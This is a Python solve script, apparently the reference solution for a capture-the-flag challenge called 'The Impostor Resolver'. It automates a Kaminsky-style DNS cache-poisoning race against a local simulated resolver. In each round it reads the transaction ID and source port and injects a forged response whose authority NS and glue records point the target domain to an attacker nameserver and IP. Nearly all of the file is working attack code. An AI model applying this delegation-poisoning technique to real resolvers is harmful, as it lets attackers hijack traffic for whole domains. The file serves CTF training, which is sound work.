#!/usr/bin/env python3
"""
Reference exploit for THE IMPOSTOR RESOLVER.

Automates the Kaminsky race: for each attempt,
ask the resolver (crew) to look up a fresh random subdomain of the target
domain, immediately read the Admin table (/egress) to learn that round's
txid + source port (the crewmate's "colour"), then "vent in" (/inject) a
forged response before the real crewmate's deadline. The forged response
poisons the DELEGATION (an authority NS record for the target plus an
additional glue A record for that nameserver) -- not just the one leaf
subdomain -- which is what makes the target domain itself resolve to the
attacker IP.

A single resolve -> sniff -> inject round trip by hand almost always loses
the race (the window is short and jittered), but losing a round costs
nothing: a fresh random subdomain gives a fresh, unlimited attempt. This
script just automates that loop until one attempt lands inside its window.

Usage:
    pip install requests
    python solve.py [BASE_URL]        # default http://localhost:5000
"""
import random
import string
import sys

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000").rstrip("/")
IMPOSTOR_NS = "ns.evil.ctf"
IMPOSTOR_IP = "6.6.6.6"
MAX_ATTEMPTS = 500


def rand_label(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def main():
    s = requests.Session()

    cfg = s.get(BASE + "/config", timeout=5).json()
    target = cfg["target"]
    print("[*] target domain   : {}".format(target))
    print("[*] race window      : {}-{} ms".format(cfg["race_window_min_ms"], cfg["race_window_max_ms"]))
    print("[*] delegation poison required: {}".format(cfg["require_authority_poison"]))
    print()

    won = False
    for attempt in range(1, MAX_ATTEMPTS + 1):
        sub = rand_label() + "." + target

        r = s.post(BASE + "/resolve", json={"name": sub}, timeout=5).json()
        if r.get("status") != "querying":
            # already poisoned, or something odd -- just retry with a new name
            continue

        egress = s.get(BASE + "/egress", timeout=5).json()
        row = next((p for p in egress.get("pending", []) if p["qname"] == sub), None)
        if row is None:
            # too slow even to read the table before it expired -- burn it, retry
            print("[-] attempt {:3d}: round vanished before we could sniff it".format(attempt))
            continue

        forged = {
            "txid": row["txid"],
            "sport": row["sport"],
            "qname": sub,
            "flags": {"qr": True, "aa": True},
            "answer": [{"name": sub, "type": "A", "data": IMPOSTOR_IP}],
            "authority": [{"name": target, "type": "NS", "data": IMPOSTOR_NS}],
            "additional": [{"name": IMPOSTOR_NS, "type": "A", "data": IMPOSTOR_IP}],
        }
        res = s.post(BASE + "/inject", json=forged, timeout=5).json()

        if res.get("success") and res.get("poisoned"):
            print("[+] attempt {:3d}: VENTED IN -- delegation poisoned ({} -> {} -> {})".format(
                attempt, target, res.get("ns"), res.get("glue_ip")))
            won = True
            break

        print("[-] attempt {:3d}: {} ({})".format(attempt, res.get("reason", "fail"), res.get("message")))

    if not won:
        print("\n[!] gave up after {} attempts without winning the race".format(MAX_ATTEMPTS))
        sys.exit(1)

    final = s.post(BASE + "/resolve", json={"name": target}, timeout=5).json()
    if final.get("poisoned"):
        print()
        print("[+] {} now resolves to {}".format(target, final.get("ip")))
        print("[+] FLAG: {}".format(final.get("flag")))
    else:
        print("\n[!] unexpected: delegation was cached but resolve isn't poisoned: {}".format(final))
        sys.exit(1)


if __name__ == "__main__":
    main()
